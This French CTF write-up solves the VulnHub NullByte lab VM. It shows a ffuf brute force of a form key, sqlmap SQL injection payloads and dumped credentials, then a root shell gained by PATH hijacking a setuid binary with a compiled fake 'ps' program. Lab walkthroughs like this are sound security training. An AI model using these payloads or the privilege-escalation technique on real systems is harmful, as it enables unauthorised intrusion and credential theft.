# Solution du CTF NullByte de VulnHub

[NullByte](https://vulnhub.com/entry/nullbyte-1,126/) est un CTF proposé sur VulnHub et datant du mois d'aout 2015. Il est plutôt simple mais attention le début est *un peu* orienté stéganographie ce qui peu dérouter les participants.

```
Nmap scan report for 192.168.56.93
Host is up (0.0012s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Null Byte 00 - level 1
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          45635/udp6  status
|   100024  1          46283/tcp6  status
|   100024  1          50378/udp   status
|_  100024  1          55523/tcp   status
777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 163013d9d55536e81bb7d9ba552fd744 (DSA)
|   2048 29aa7d2e608ba6a1c2bd7cc8bd3cf4f2 (RSA)
|   256 6006e3648f8a6fa7745a8b3fe1249396 (ECDSA)
|_  256 bcf7448d796a194876a3e24492dc13a2 (ED25519)
55523/tcp open  status  1 (RPC #100024)
```

Sur la page d'index juste une image GIF. On lé télécharge et on lance `exiftool` dessus :

```
$ exiftool main.gif 
ExifTool Version Number         : 12.50
File Name                       : main.gif
Directory                       : .
File Size                       : 17 kB
File Permissions                : -rw-r--r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
Megapixels                      : 0.071
```

Le commentaire sur l'image correspond à un nom de dossier sur le serveur web. On y trouve un formulaire qui demande une clé, visiblement il n'y a pas de backend derrière, la solution doit être hardcodée :

```html
<center>
<form method="post" action="index.php">
Key:<br>
<input type="password" name="key">
</form> 
</center>
<!-- this form isn't connected to mysql, password ain't that complex --!>
```

Par conséquent on peut se permettre de bourriner pour trouver cette clé :

```shellsession
$ ffuf -u "http://192.168.56.93/kzMb5nVYJw/index.php" -w wordlists/rockyou.txt -X POST -d "key=FUZZ" -H "Content-type: application/x-www-form-urlencoded" -fs 244

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.56.93/kzMb5nVYJw/index.php
 :: Wordlist         : FUZZ: wordlists/rockyou.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : key=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 244
________________________________________________

elite                   [Status: 200, Size: 145, Words: 9, Lines: 7]
```

Ce mot de passe tombe assez rapidement. Quand on le saisit on parvient sur un script PHP auquel on peut passer un nom d'utilisateur :

http://192.168.56.93/kzMb5nVYJw/420search.php?usrtosearch=yoyo

Le script indique juste :

> Fetched data successfully

J'ai d'abord pensé à un SSRF puisque 420 fait penser à un code HTTP mais si on place une apostrophe on obtient une erreur SQL.

On passe l'URL à `sqlmap` qui n'en fait qu'une bouchée :

```
---
Parameter: usrtosearch (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: usrtosearch=yoyo" OR NOT 1289=1289-- SoOq

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: usrtosearch=yoyo" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7162716a71,(SELECT (ELT(8532=8532,1))),0x716b7a7671,0x78))s), 8446744073709551610, 8446744073709551610)))-- sYSg

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: usrtosearch=yoyo" AND (SELECT 9187 FROM (SELECT(SLEEP(5)))kiRz)-- BroV

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: usrtosearch=yoyo" UNION ALL SELECT CONCAT(0x7162716a71,0x4a6f4b4a766e58634f566e4f6c774e66584948715273724957686147764c687863414f6e7a434e42,0x716b7a7671),NULL,NULL-- -
---
```

En rajoutant les options de dump habituelles j'obtiens des identifiants dans `seth.users` :

```
Database: seth
Table: users
[2 entries]
+----+---------------------------------------------+--------+------------+
| id | pass                                        | user   | position   |
+----+---------------------------------------------+--------+------------+
| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
| 2  | --not allowed--                             | isis   | employee   |
+----+---------------------------------------------+--------+------------+
```

Le base64 se décode avec un warning en `omega`. Les identifiants `ramses` / `omega` permettent de se connecter en SSH sur le port 777.

Sous `/var/www` je trouve un dossier `backup` contenant un binaire setuid root :

```shellsession
ramses@NullByte:/var/www/backup$ ls
total 20K
drwxrwxrwx 2 root root 4.0K Aug  2  2015 .
drwxr-xr-x 4 root root 4.0K Aug  2  2015 ..
-rwsr-xr-x 1 root root 4.9K Aug  2  2015 procwatch
-rw-r--r-- 1 root root   28 Aug  2  2015 readme.txt
ramses@NullByte:/var/www/backup$ cat readme.txt 
I have to fix this mess...
```

Le binaire est très simple, il appelle juste la commande `ps` via `system()` qui est sujet aux altérations de l'environnement.

```nasm
int main (int argc, char **argv, char **envp);
; var const char *string @ ebp-0x3a
; var int32_t var_4h @ ebp-0x4
; arg char **argv @ esp+0x64
0x080483fb      lea     ecx, [argv]
0x080483ff      and     esp, 0xfffffff0
0x08048402      push    dword [ecx - 4]
0x08048405      push    ebp
0x08048406      mov     ebp, esp
0x08048408      push    ecx
0x08048409      sub     esp, 0x44
0x0804840c      lea     eax, [string]
0x0804840f      mov     word [eax], 0x7370 ; 'ps'
0x08048414      mov     byte [eax + 2], 0
0x08048418      sub     esp, 0xc
0x0804841b      lea     eax, [string]
0x0804841e      push    eax        ; const char *string
0x0804841f      call    system     ; sym.imp.system ; int system(const char *string)
0x08048424      add     esp, 0x10
0x08048427      mov     eax, 0
0x0804842c      mov     ecx, dword [var_4h]
0x0804842f      leave
0x08048430      lea     esp, [ecx - 4]
0x08048433      ret
```

Je compile un petit programme sous le nom `ps` qui va fixer mes uids effectif et réel à 0 puis je modifie le PATH pour que mon programme ait la priorité :

```shellsession
$ ramses@NullByte:/var/www/backup$ cat getroot.c 
#include <unistd.h>
#include <stdlib.h>

int main(void) {
        setreuid(0, 0);
        system("/bin/dash");
        return 0;
}
ramses@NullByte:/var/www/backup$ gcc -o ps getroot.c 
ramses@NullByte:/var/www/backup$ export PATH=.:$PATH
ramses@NullByte:/var/www/backup$ ./procwatch 
# id
uid=0(root) gid=1002(ramses) groups=1002(ramses)
# cd /root
# ls
proof.txt
# cat proof.txt
adf11c7a9e6523e630aaf3b9b7acb51d

It seems that you have pwned the box, congrats. 
Now you done that I wanna talk with you. Write a walk & mail at
xly0n@sigaint.org attach the walk and proof.txt
If sigaint.org is down you may mail at nbsly0n@gmail.com


USE THIS PGP PUBLIC KEY

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: BCPG C# v1.6.1.0

mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
Gms=
=PiAQ
-----END PGP PUBLIC KEY BLOCK-----
```

*Publié le 3 janvier 2023*